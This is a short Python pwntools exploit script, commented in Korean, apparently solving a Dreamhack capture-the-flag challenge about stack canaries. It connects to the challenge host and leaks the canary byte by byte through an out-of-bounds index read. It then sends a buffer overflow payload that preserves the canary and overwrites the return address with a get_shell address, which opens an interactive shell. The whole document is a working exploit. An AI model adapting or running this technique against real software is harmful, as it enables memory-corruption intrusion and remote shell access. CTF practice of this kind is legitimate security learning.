# 카나리 문제 풀이
# 시험 전 부터해서 이제 풀었따.

from pwn import *

p = remote("host3.dreamhack.games",13505)

get_shell = 0x080486b9


canary = b""

i = 131
while i >= 128:
  p.sendlineafter("> ", 'P')
  p.sendlineafter("Element index : ", str(i))
  p.recvuntil("is : ")
  canary += p.recvn(2)
  i = i - 1

canary = int(canary, 16)

payload = b'A'*0x40+p32(canary)+b'C'*4+b'D'*4+p32(get_shell)

p.sendlineafter("> ", 'E')
p.sendlineafter("Name Size : ", str(1000))
p.sendlineafter("Name : ", payload)

p.interactive()